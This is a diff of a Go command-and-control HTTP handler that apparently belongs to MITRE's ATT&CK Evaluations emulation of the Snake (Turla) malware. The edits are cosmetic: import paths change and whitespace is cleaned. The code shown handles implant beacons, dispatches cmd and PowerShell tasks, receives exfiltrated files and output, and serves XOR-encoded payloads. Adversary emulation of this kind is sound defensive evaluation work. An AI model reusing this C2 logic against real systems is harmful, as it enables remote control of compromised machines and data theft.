@@ -14,9 +14,9 @@ import (
     "strings"
     "time"
 
-    "attackevals.mitre-engenuity.org/control_server/config"
-    "attackevals.mitre-engenuity.org/control_server/handlers/util"
-    "attackevals.mitre-engenuity.org/control_server/logger"
+    "attackevals.mitre.org/control_server/config"
+    "attackevals.mitre.org/control_server/handlers/util"
+    "attackevals.mitre.org/control_server/logger"
     "github.com/gorilla/mux"
     "golang.org/x/text/encoding/unicode"
 )
@@ -61,7 +61,7 @@ type SnakeHttpHandler struct {
     pendingPayloads map[string]string // map instruction ID to the payload file to download
     pendingUploads map[string]string // map instruction ID to the file name to save the uploaded file as
     instructionImplantMap map[string]string // map instruction ID to corresponding implant ID
-     
+
     randIntnGetter RandIntnGetter // Wrapper for RandIntn (math/rand)
     utcTimeNowGetter UtcTimeNowGetter // Wrapper for time.Now / time.Utc (time)
 }
@@ -136,7 +136,7 @@ func (s *SnakeHttpHandler) StartHandler(restAddress string, configEntry config.H
     urlRouter.HandleFunc("/PUB/{identifier}", s.handleBeacon).Methods("GET")
     urlRouter.HandleFunc("/IMAGES/3/{identifier}", s.handleUpload).Methods("POST")
     urlRouter.HandleFunc("/IMAGES/3/{identifier}", s.handlePayloadDownload).Methods("GET")
-    
+
     // start handler in goroutine so it doesn't block
     go func() {
         err := s.server.ListenAndServe()
@@ -165,7 +165,7 @@ func (s *SnakeHttpHandler) handleBeacon(w http.ResponseWriter, r *http.Request) 
         w.Write([]byte(serverErrMsg))
         return
     }
-    
+
     // Snake malware fetches a file /D/pub.txt, and expects the server to respond with a string "1", acknowledging it’s active:
     // https://artemonsecurity.com/snake_whitepaper.pdf
     // Here we decide to use /PUB/home.html instead of /D/pub.txt.
@@ -175,10 +175,10 @@ func (s *SnakeHttpHandler) handleBeacon(w http.ResponseWriter, r *http.Request) 
         w.Write([]byte("1"))
         return
     }
-    
+
     // We received a beacon from an implant that already performed the heartbeat check.
     logger.Debug(fmt.Sprintf("Received beacon with ID %s.", requestIdentifier))
-        
+
     // Check if the identifier matches a victim ID that currently exists.
     if !s.hasImplantSession(requestIdentifier) {
         logger.Info(fmt.Sprintf("Received first-time beacon from %s. Creating session.", requestIdentifier))
@@ -189,7 +189,7 @@ func (s *SnakeHttpHandler) handleBeacon(w http.ResponseWriter, r *http.Request) 
             w.Write([]byte(serverErrMsg))
             return
         }
-        
+
         // get bootstrap task for implant
         task, err = s.getBootstrapTask()
         if err != nil {
@@ -359,14 +359,14 @@ func extractInstructionInfo(task string) (*InstructionInfo, error) {
 	if err != nil {
 	    return nil, err
 	}
-	
+
 	// Extract task type code
 	if typeCode, ok := instructionData["type"]; ok {
 	    instructionInfo.typeCode = fmt.Sprintf("%02d", int(typeCode.(float64)))
 	} else {
 	    return nil, errors.New("No task type code provided.")
 	}
-	
+
 	if command, ok := instructionData["command"]; ok {
 	    shellCommand = strings.TrimSpace(command.(string))
 	}
@@ -385,7 +385,7 @@ func extractInstructionInfo(task string) (*InstructionInfo, error) {
     if runas, ok := instructionData["runas"]; ok {
 	    runasUser = strings.TrimSpace(runas.(string))
     }
-	
+
 	switch instructionInfo.typeCode {
 	case cmdInstructionCode, pshInstructionCode:
 	    if len(shellCommand) == 0 {
@@ -551,7 +551,7 @@ func (s *SnakeHttpHandler) forwardTaskOutput(guid string, data []byte) (string, 
 func (s *SnakeHttpHandler) handleUpload(w http.ResponseWriter, r *http.Request) {
     var response string
     var err error
-    
+
     vars := mux.Vars(r)
     instructionId, ok := vars["identifier"]
     if !ok {
@@ -567,7 +567,7 @@ func (s *SnakeHttpHandler) handleUpload(w http.ResponseWriter, r *http.Request) 
         w.Write([]byte(serverErrMsg))
         return
     }
-    
+
     filename, ok := s.pendingUploads[instructionId]
     if !ok {
         // This instruction is not tied to a normal file upload - assume it's for command task output or log file.
@@ -586,7 +586,7 @@ func (s *SnakeHttpHandler) handleUpload(w http.ResponseWriter, r *http.Request) 
             response, err = s.processAndForwardLog(pipeClientLogFileName + s.getTimeExtension("log"), postBody)
         default:
             logger.Info("Received task output for instruction ID: ", instructionId)
-            
+
             // Get implant ID corresponding to the instruction ID
             guid, ok := s.instructionImplantMap[instructionId]
             if !ok {
@@ -595,7 +595,7 @@ func (s *SnakeHttpHandler) handleUpload(w http.ResponseWriter, r *http.Request) 
                 w.Write([]byte(serverErrMsg))
                 return
             }
-            
+
             // Decrypt and forward task output
             response, err = s.forwardTaskOutput(guid, xorData(postBody))
             if err != nil {
@@ -611,7 +611,7 @@ func (s *SnakeHttpHandler) handleUpload(w http.ResponseWriter, r *http.Request) 
     } else {
         // Save upload file
         logger.Info("Received file upload request for file name: ", filename)
-        
+
         // Get implant ID corresponding to the instruction ID
         guid, ok := s.instructionImplantMap[instructionId]
         if !ok {
@@ -620,7 +620,7 @@ func (s *SnakeHttpHandler) handleUpload(w http.ResponseWriter, r *http.Request) 
             w.Write([]byte(serverErrMsg))
             return
         }
-        
+
         response, err = s.processAndForwardUpload(filename, xorData(postBody))
         if err != nil {
             logger.Error(fmt.Sprintf("Failed to process and forward upload: %s", err.Error()))
@@ -628,11 +628,11 @@ func (s *SnakeHttpHandler) handleUpload(w http.ResponseWriter, r *http.Request) 
             w.Write([]byte(serverErrMsg))
             return
         }
-        
+
         // Send success response to implant
         logger.Success(response)
         fmt.Fprint(w, "1")
-        
+
         // Let REST API server know that the upload task completed
         response, err = util.ForwardTaskOutput(s.restAPIaddress, guid, []byte(fmt.Sprintf("Received and processed file upload %s for implant %s", filename, guid)))
         if err != nil {
@@ -673,7 +673,7 @@ func (s *SnakeHttpHandler) handlePayloadDownload(w http.ResponseWriter, r *http.
         return
     }
     logger.Info("Received file download request for payload: ", payload)
-    
+
     // Get implant ID for the instruction
     guid, ok := s.instructionImplantMap[instructionId]
     if !ok {
@@ -682,7 +682,7 @@ func (s *SnakeHttpHandler) handlePayloadDownload(w http.ResponseWriter, r *http.
         w.Write([]byte(serverErrMsg))
         return
     }
-    
+
     fileData, err := s.forwardGetFileFromServer(payload)
     if err != nil {
         logger.Error(fmt.Sprintf("Failed to perform file download request: %s", err.Error()))
@@ -690,11 +690,11 @@ func (s *SnakeHttpHandler) handlePayloadDownload(w http.ResponseWriter, r *http.
         w.Write([]byte(serverErrMsg))
         return
     }
-    
+
     // Send payload data to implant
     w.WriteHeader(http.StatusOK)
     w.Write(xorData(fileData))
-    
+
     // Let REST API server know that the upload task completed
     resp, err := util.ForwardTaskOutput(s.restAPIaddress, guid, []byte(fmt.Sprintf("Sent payload %s to implant %s", payload, guid)))
     if err != nil {
